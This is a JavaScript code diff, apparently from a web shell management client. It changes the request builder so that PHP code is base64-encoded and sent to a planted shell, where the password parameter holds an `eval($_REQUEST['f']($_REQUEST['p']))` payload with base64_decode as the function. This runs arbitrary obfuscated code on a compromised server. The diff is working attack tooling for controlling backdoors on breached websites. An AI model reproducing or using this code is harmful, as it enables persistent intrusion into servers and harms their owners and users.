@@ -1,4 +1,5 @@
 import request from './http'
+import base64 from './base64'
 
 export default {
     $console(v) {
@@ -82,10 +83,22 @@ export default {
         }
         return shell.url + '?' + shell.pwd + '='
     },
-    async $genRequest(shell, params, encode) {
+    async $genRequest(shell, code, encode) {
         shell.encode = 'UTF-8'
-        params = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + params
-        // return this.$request(shell.shellUrl + params)
-        return request(this.$geneShellUrl(shell) + params)
+        code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code
+
+        let base64Str = base64._encode(code, false)
+        // base64Str.replace(/ /g, '+')
+        base64Str = encodeURIComponent(base64Str)
+
+        let params = {f: 'base64_decode', p: base64Str, r: code}
+        params[shell.pwd] = `eval($_REQUEST['f']($_REQUEST['p']));`
+        // params[shell.pwd] = `eval(base64_decode(${base64Str}));`
+
+        // console.log(params)
+        if (shell.requestType === 1) {
+            return request(shell.url, params, {}, 'POST')
+        }
+        return request(shell.url, {}, params)
     },
 }
